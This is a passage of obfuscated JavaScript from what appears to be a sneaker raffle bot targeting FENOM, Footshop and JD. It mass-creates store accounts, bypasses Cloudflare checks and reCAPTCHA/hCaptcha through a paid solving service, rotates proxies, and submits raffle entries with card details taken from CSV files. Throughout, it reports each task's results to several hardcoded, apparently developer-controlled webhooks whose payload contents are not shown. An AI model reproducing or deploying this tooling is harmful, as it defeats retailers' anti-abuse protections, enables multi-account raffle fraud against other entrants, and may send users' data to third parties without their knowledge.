                            }), console['log'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20Getting\x20Session'), await _0x333ee6['goto']('' + _0x5d10c2, { 'waitUntil': 'networkidle2' }), await _0x2bc7d2(0x1388), console['log'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x1f8188 = await _0x333ee6['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x1f8188 && await _0x1f8188['click']();
                            } catch {
                            }
                            await _0x2dd1f['send']('Browser.setWindowBounds', {
                                'windowId': _0x4a8ac2,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x333ee6['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x2bc7d2(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x333ee6['type']('input[name=\x22firstname\x22]', '' + _0xa25fc8[_0x3e1afe]['FirstName']), await _0x2bc7d2(0x1f4), await _0x333ee6['type']('input[name=\x22lastname\x22]', '' + _0xa25fc8[_0x3e1afe]['LastName']), await _0x2bc7d2(0x1f4), await _0x333ee6['type']('input[name=\x22email\x22]', '' + _0xa25fc8[_0x3e1afe]['Email']), await _0x2bc7d2(0x1f4), await _0x333ee6['type']('input[name=\x22password\x22]', '' + _0xa25fc8[_0x3e1afe]['Password']), await _0x2bc7d2(0x258), await _0x333ee6['$eval']('input[name=\x22psgdpr\x22]', _0x17a5ce => _0x17a5ce['click']()), await _0x2bc7d2(0x1f4), console['log'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20Sending\x20Request'), await _0x333ee6['$eval']('#customer-form', _0x1e28ca => _0x1e28ca['submit']());
                            try {
                                await _0x333ee6['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x2f0e06 = 'no', console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20Account\x20' + _0xa25fc8[_0x3e1afe]['Email'] + '\x20Generated')), _0xd8dc96['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0xa25fc8[_0x3e1afe]['Email'] + ',' + _0xa25fc8[_0x3e1afe]['Password']);
                                try {
                                    _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x4d68be['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5e696c(_0x29936e, _0x4d68be['succesDEVMSG']);
                            } catch (_0x582419) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x582419);
                            }
                        } catch (_0x4be6fe) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20' + _0x4be6fe)), _0x323cd2 = '' + _0x4be6fe;
                            var _0xf16894 = await _0x1487ea(_0xa25fc8[_0x3e1afe], _0x4bbe96, 'acc', !![], _0x323cd2);
                            _0x4d68be['errorDEV'] = { 'embeds': [_0xf16894] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x4d68be['errorDEV']), await _0x5e696c(_0x8997ff, _0x4d68be['errorDEV']), _0x2f0e06 = 'yes';
                        } finally {
                            _0x3cd655['close']();
                            if (_0x2f0e06 == 'yes' && _0xe0fad6 != 0x5 && _0x323cd2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20:\x20Retrying')), _0x3e1afe = _0x3e1afe - 0x1, _0xe0fad6 = _0xe0fad6 + 0x1;
                                continue;
                            }
                            _0x2f0e06 == 'yes' && _0xe0fad6 >= 0x5 && (_0x4b302f(_0xa25fc8[_0x3e1afe], _0x4bbe96), _0x2f0e06 = 'no', _0xe0fad6 = 0x0), console['log'](_0x207f7e() + '\x20[' + _0x4bbe96['name'] + ']\x20Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4dc764(_0x41cea8, _0x37a740, _0x2193d1) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x40cb3b = 0x0; _0x40cb3b < _0x37a740['length']; _0x40cb3b++) {
                        if (_0x552f08 != 'yes')
                            var _0x552f08 = '', _0x494688 = 0x0;
                        var _0x460c01;
                        await _0x38eff1(_0x37a740, _0x40cb3b), _0x535b9c(_0x41cea8['name'] + '\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20/\x20' + _0x37a740['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
                        const _0x3fc700 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4d7b30 = Math['round'](Math['random']() * (_0x2193d1['length'] - 0x1)), _0xf4f5e3 = _0x2193d1[_0x4d7b30]['split'](':'), _0x52fb48;
                        try {
                            _0x52fb48 = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xf4f5e3[0x0] + ':' + _0xf4f5e3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x52fb48 = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xf4f5e3[0x0] + ':' + _0xf4f5e3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1d5195 = await _0x52fb48['newPage'](), _0x1a7961 = await _0x1d5195['target']()['createCDPSession'](), { windowId: _0x4c85e } = await _0x1a7961['send']('Browser.getWindowForTarget');
                            await _0x1d5195['authenticate']({
                                'username': '' + _0xf4f5e3[0x2],
                                'password': '' + _0xf4f5e3[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d5195['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2bc7d2(0xbb8), await _0x1a7961['send']('Browser.setWindowBounds', {
                                'windowId': _0x4c85e,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x2bc7d2(0x1f40);
                            try {
                                await _0x1d5195['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x2bc7d2(0x1388), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Logging\x20in'), await _0x1d5195['type']('input[name=\x22email\x22]', '' + _0x37a740[_0x40cb3b]['Email']), await _0x2bc7d2(0x1f4), await _0x1d5195['type']('input[name=\x22password\x22]', '' + _0x37a740[_0x40cb3b]['Password']), await _0x2bc7d2(0x258), await _0x1d5195['$eval']('#login-form', _0x7f0c9e => _0x7f0c9e['submit']()), await _0x1d5195['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x2bc7d2(0x1f4), await _0x1d5195['goto']('' + _0x37a740[_0x40cb3b]['Url']), await _0x1d5195['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x37a740[_0x40cb3b]['Size']);
                            if (_0x37a740[_0x40cb3b]['Size'] != 'RANDOM') {
                                var _0x57ac60 = '\x20' + _0x37a740[_0x40cb3b]['Size'] + '\x20';
                                const _0x5d4135 = await _0x1d5195['$x']('//span[contains(text(),\x20' + _0x57ac60 + ')]');
                                await _0x5d4135[0x0]['click']();
                            } else {
                                const _0x4699b8 = await _0x1d5195['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0xf3782 = Math['round'](Math['random']() * (_0x4699b8['length'] - 0x1));
                                await _0x4699b8[_0xf3782]['click']();
                            }
                            await _0x2bc7d2(0x258), await _0x1d5195['click']('#cookieChoiceDismiss'), await _0x2bc7d2(0x3e8), await _0x1d5195['type']('#instagram-account', '' + _0x37a740[_0x40cb3b]['Follower']), await _0x2bc7d2(0x28a), await _0x1d5195['click']('#book-btn'), await _0x2bc7d2(0xbb8), await _0x1d5195['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x2bc7d2(0x1f4), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20' + _0x49dcd4['cyan']('Solving\x20Captcha')), await _0x1d5195['solveRecaptchas'](), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2bc7d2(0x7d0), await _0x1d5195['$eval']('#book-btn-for-sure', _0x463ec6 => _0x463ec6['click']()), await _0x2bc7d2(0x12c), await _0x1d5195['click']('#book-btn-for-sure'), await _0x2bc7d2(0xdac);
                            const _0x315702 = await _0x1d5195['$eval']('.reservation-popup\x20>\x20.title', _0x2cbfc5 => {
                                return _0x2cbfc5['innerHTML'];
                            });
                            if (_0x315702) {
                                _0x552f08 = 'no', _0x1560d5(_0x37a740[_0x40cb3b], _0x41cea8), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xe9bd23 = await _0x1487ea(_0x37a740[_0x40cb3b], _0x41cea8, 'dev', ![]), _0x1a9041 = await _0x1487ea(_0x37a740[_0x40cb3b], _0x41cea8, 'pub', ![]);
                                const _0x337fc6 = {
                                    'succesDEVMSG': { 'embeds': [_0xe9bd23] },
                                    'succesPUBMSG': { 'embeds': [_0x1a9041] }
                                };
                                try {
                                    _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x337fc6['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x337fc6['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x3ebea8, _0x337fc6['succesPUBMSG']);
                                } catch (_0x2b28cc) {
                                    console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2b28cc));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x6830d1) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20' + _0x6830d1)), _0x460c01 = '' + _0x6830d1;
                            var _0x2ba35d = await _0x1487ea(_0x37a740[_0x40cb3b], _0x41cea8, 'dev', !![], _0x460c01), _0xe9bd23 = await _0x1487ea(_0x37a740[_0x40cb3b], _0x41cea8, 'dev', ![]), _0x1a9041 = await _0x1487ea(_0x37a740[_0x40cb3b], _0x41cea8, 'pub', ![]);
                            const _0x2cf02f = {
                                'succesDEVMSG': { 'embeds': [_0xe9bd23] },
                                'succesPUBMSG': { 'embeds': [_0x1a9041] }
                            };
                            _0x2cf02f['errorDEV'] = { 'embeds': [_0x2ba35d] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x2cf02f['errorDEV']), await _0x5e696c(_0x8997ff, _0x2cf02f['errorDEV']), _0x6830d1 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x552f08 = 'yes');
                        } finally {
                            _0x52fb48['close']();
                            if (_0x552f08 == 'yes' && _0x494688 != 0x5 && _0x460c01 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Task\x20' + (_0x40cb3b + 0x1) + '\x20:\x20Retrying')), _0x40cb3b = _0x40cb3b - 0x1, _0x494688 = _0x494688 + 0x1;
                                continue;
                            }
                            _0x552f08 == 'yes' && _0x494688 >= 0x5 && (_0x4b302f(_0x37a740[_0x40cb3b], _0x41cea8), _0x552f08 = 'no', _0x494688 = 0x0), console['log'](_0x207f7e() + '\x20[' + _0x41cea8['name'] + ']\x20Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x439824, _0x2b3f1f, _0x1575bd) {
                _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x397a11['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x25196a = 0x0; _0x25196a < _0x2b3f1f['length']; _0x25196a++) {
                    var _0xd444ac;
                    if (_0x69b015 != 'yes')
                        var _0x69b015 = '', _0x1fa1ce = 0x0;
                    var _0x32e996 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3b1bf1
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2b3f1f[_0x25196a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2b3f1f[_0x25196a]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x397a11['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x14595d
                            }
                        ]
                    }], _0x2878a5 = await _0x1487ea(_0x2b3f1f[_0x25196a], _0x439824, 'dev', ![]), _0x4140cc = await _0x1487ea(_0x2b3f1f[_0x25196a], _0x439824, 'pub', ![]);
                    const _0x157c86 = {
                        'succesDEVMSG': { 'embeds': [_0x2878a5] },
                        'succesPUBMSG': { 'embeds': [_0x4140cc] }
                    }, _0x41fc0c = { 'embeds': _0x32e996 };
                    await _0x38eff1(_0x2b3f1f, _0x25196a);
                    if (_0x2b3f1f[_0x25196a]['Email'] == '' || _0x2b3f1f[_0x25196a]['FirstName'] == '' || _0x2b3f1f[_0x25196a]['LastName'] == '' || _0x2b3f1f[_0x25196a]['Country'] == '' || _0x2b3f1f[_0x25196a]['Size'] == '' || _0x2b3f1f[_0x25196a]['Address1'] == '' || _0x2b3f1f[_0x25196a]['Zip'] == '') {
                        console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2b3f1f[_0x25196a]['Email'] == '' || _0x2b3f1f[_0x25196a]['FirstName'] == '' || _0x2b3f1f[_0x25196a]['LastName'] == '' || _0x2b3f1f[_0x25196a]['Country'] == '' || _0x2b3f1f[_0x25196a]['Size'] == '' || _0x2b3f1f[_0x25196a]['Address1'] == '' || _0x2b3f1f[_0x25196a]['Zip'] == '' || _0x2b3f1f[_0x25196a]['Phone'] == '') {
                        console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4c969f = '' + _0x2b3f1f[_0x25196a]['Url'];
                    if (_0x397a11['useRandomProxy'] = ![])
                        var _0x51ed2f = _0x1575bd[_0x25196a]['split'](':');
                    else
                        var _0x1ffd82 = Math['round'](Math['random']() * (_0x1575bd['length'] - 0x1)), _0x51ed2f = _0x1575bd[_0x1ffd82]['split'](':');
                    const _0x2fe4db = await _0x4e5975['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x51ed2f[0x0] + ':' + _0x51ed2f[0x1]]
                    });
                    try {
                        const _0x5d40c2 = await _0x2fe4db['newPage']();
                        await _0x5d40c2['authenticate']({
                            'username': '' + _0x51ed2f[0x2],
                            'password': '' + _0x51ed2f[0x3]
                        }), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d40c2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5d40c2['setRequestInterception'](!![]), _0x5d40c2['on']('request', _0x3818e5 => {
                            _0x3818e5['resourceType']() === 'image' || _0x3818e5['resourceType']() === 'font' || _0x3818e5['resourceType']() === 'media' ? _0x3818e5['abort']() : _0x3818e5['continue']();
                        }), await _0x5d40c2['goto'](_0x4c969f), await _0x2bc7d2(0xbb8), await _0x5d40c2['waitForSelector']('.control__JhutY'), await _0x5d40c2['click']('.control__JhutY'), await _0x2bc7d2(0x1f4);
                        if (_0x2b3f1f[_0x25196a]['Size'] != 'RANDOM')
                            try {
                                const _0x16e34b = await _0x5d40c2['$x']('//div[contains(text(),\x20\x27' + _0x2b3f1f[_0x25196a]['Size'] + '\x27)]');
                                await _0x16e34b[0x0]['click']();
                            } catch {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x439393 = await _0x5d40c2['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x1b1b60 = Math['round'](Math['random']() * (_0x439393['length'] - 0x1));
                            await _0x439393[_0x1b1b60]['click']();
                        }
                        await _0x2bc7d2(0x4b0);
                        const _0x151ed6 = await _0x5d40c2['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x151ed6[0x0]['click'](), await _0x5d40c2['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5d40c2['type']('input[name=\x22email\x22]', '' + _0x2b3f1f[_0x25196a]['Email']), await _0x2bc7d2(0x640), await _0x5d40c2['type']('input[name=\x22phone\x22]', '' + _0x2b3f1f[_0x25196a]['Phone']), await _0x2bc7d2(0x4b0), await _0x5d40c2['click']('button.btn.continue-button__1RtsS'), await _0x2bc7d2(0x4b0);
                        try {
                            await _0x5d40c2['type']('input[name=\x22firstName\x22]', '' + _0x2b3f1f[_0x25196a]['FirstName']), await _0x2bc7d2(0x258);
                        } catch {
                            const _0x2fd9d0 = await _0x5d40c2['$$eval']('.invalid-feedback\x20>\x20div', _0x194752 => {
                                return _0x194752['map'](_0x24a72b => _0x24a72b['innerText']);
                            });
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20' + _0x2fd9d0));
                            continue;
                        }
                        await _0x5d40c2['type']('input[name=\x22lastName\x22]', '' + _0x2b3f1f[_0x25196a]['LastName']), await _0x2bc7d2(0xc8), await _0x5d40c2['type']('input[name=\x22instagramUsername\x22]', '' + _0x2b3f1f[_0x25196a]['Follower']), await _0x2bc7d2(0x4b0), await _0x5d40c2['click']('button.btn.continue-button__1RtsS'), await _0x2bc7d2(0x3e8), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5d40c2['select']('select[name=\x22country\x22]', '' + _0x2b3f1f[_0x25196a]['Country']), await _0x2bc7d2(0x2bc), await _0x5d40c2['type']('input[name=\x22streetName\x22]', '' + _0x2b3f1f[_0x25196a]['Address1']), await _0x2bc7d2(0x258), await _0x5d40c2['type']('input[name=\x22houseNumber\x22]', _0x2b3f1f[_0x25196a]['HouseNumber'] + '\x20' + _0x2b3f1f[_0x25196a]['Address2']), await _0x2bc7d2(0xc8), await _0x5d40c2['type']('input[name=\x22postalCode\x22]', '' + _0x2b3f1f[_0x25196a]['Zip']), await _0x2bc7d2(0x1f4), await _0x5d40c2['type']('input[name=\x22city\x22]', '' + _0x2b3f1f[_0x25196a]['City']), await _0x2bc7d2(0x4b0), await _0x5d40c2['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x2bc7d2(0x4b0), await _0x5d40c2['click']('button.btn.continue-button__1RtsS'), await _0x2bc7d2(0x4b0), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5d40c2['solveRecaptchas'](), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x2bc7d2(0xbb8), await _0x5d40c2['click']('button.btn.continue-button__1RtsS'), await _0x2bc7d2(0x1388), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5d40c2['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5d40c2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2bc7d2(0x4b0), await _0x5d40c2['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2b3f1f[_0x25196a]['CardNumber']), await _0x2bc7d2(0x320), await _0x5d40c2['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5d40c2['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2b3f1f[_0x25196a]['ExpiryDate']), await _0x2bc7d2(0x4b0), await _0x5d40c2['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5d40c2['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2b3f1f[_0x25196a]['CVV']), await _0x2bc7d2(0x226), await _0x5d40c2['type']('input[name=\x22holderName\x22]', '' + _0x2b3f1f[_0x25196a]['NameOnCard']), await _0x2bc7d2(0x226), await _0x5d40c2['click']('button.adyen-checkout__button'), console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x5d40c2['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x2bc7d2(0xbb8);
                        } catch (_0x5a17b3) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x203DS\x20Failed')), _0xd444ac = '3DS\x20Error\x20' + _0x5a17b3;
                            var _0xe94b81 = await _0x1487ea(_0x2b3f1f[_0x25196a], _0x439824, 'dev', !![], _0xd444ac);
                            _0x157c86['errorDEV'] = { 'embeds': [_0xe94b81] };
                            _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x157c86['errorDEV']);
                            await _0x5e696c(_0x8997ff, _0x157c86['errorDEV']);
                            continue;
                        }
                        _0x1560d5(_0x2b3f1f[_0x25196a], _0x439824), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                            try {
                                await _0x5e696c(_0x397a11['webhook'], _0x157c86['succesDEVMSG']);
                            } catch {
                            }
                        await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x157c86['succesDEVMSG']), await _0x2bc7d2(0xc8);
                        try {
                            await _0x5e696c(_0x3ebea8, _0x157c86['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x53afac) {
                        console['log'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20' + _0x53afac), _0xd444ac = '' + _0x53afac;
                        var _0xe94b81 = await _0x1487ea(_0x2b3f1f[_0x25196a], _0x439824, 'dev', !![], _0xd444ac);
                        _0x157c86['errorDEV'] = { 'embeds': [_0xe94b81] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x157c86['errorDEV']), await _0x5e696c(_0x8997ff, _0x157c86['errorDEV']), _0x69b015 = 'yes';
                    } finally {
                        _0x2fe4db['close']();
                        if (_0x69b015 == 'yes' && _0x1fa1ce != 0x5) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x439824['name'] + ']\x20Task\x20' + (_0x25196a + 0x1) + '\x20:\x20Retrying')), _0x25196a = _0x25196a - 0x1, _0x1fa1ce = _0x1fa1ce + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x397a11['footshopDelay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x3cd25b, _0x3bd90d, _0x73a12c) {
                var _0x33186c = ![], _0x293e93 = ![];
                if (_0x397a11['captchaKey'] == '' || _0x397a11['captchaKey'] == undefined)
                    return console['log'](_0x49dcd4['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x397a11['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x420b88 = 0x0; _0x420b88 < _0x3bd90d['length']; _0x420b88++) {
                    if (_0x25898d != 'yes')
                        var _0x25898d = '', _0xf7857f = 0x0;
                    var _0x4c7309, _0x1feae9 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x3bd90d[_0x420b88]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3bd90d[_0x420b88]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3b1bf1
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x397a11['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x14595d
                            }
                        ]
                    }];
                    const _0x2e9283 = { 'embeds': _0x1feae9 };
                    _0x535b9c(_0x3cd25b['name'] + '\x20Task\x20' + (_0x420b88 + 0x1) + '\x20/\x20' + _0x3bd90d['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x3bd90d, _0x420b88);
                    var _0x5c58a3 = await _0x1487ea(_0x3bd90d[_0x420b88], _0x3cd25b, 'dev', ![]), _0xa11e1f = await _0x1487ea(_0x3bd90d[_0x420b88], _0x3cd25b, 'pub', ![]);
                    const _0x3c154d = {
                        'succesDEVMSG': { 'embeds': [_0x5c58a3] },
                        'succesPUBMSG': { 'embeds': [_0xa11e1f] }
                    };
                    if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                        try {
                            await _0x5e696c(_0x397a11['webhook'], _0x3c154d['succesDEVMSG']);
                        } catch {
                        }
                    await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x3c154d['succesDEVMSG']), await _0x2bc7d2(0xc8);
                    try {
                        await _0x5e696c(_0x3ebea8, _0x3c154d['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x3bd90d[_0x420b88]['Email'] == '' || _0x3bd90d[_0x420b88]['Url'] == '' || _0x3bd90d[_0x420b88]['FirstName'] == '' || _0x3bd90d[_0x420b88]['LastName'] == '') {
                        console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x397a11['useRandomProxy'] = ![])
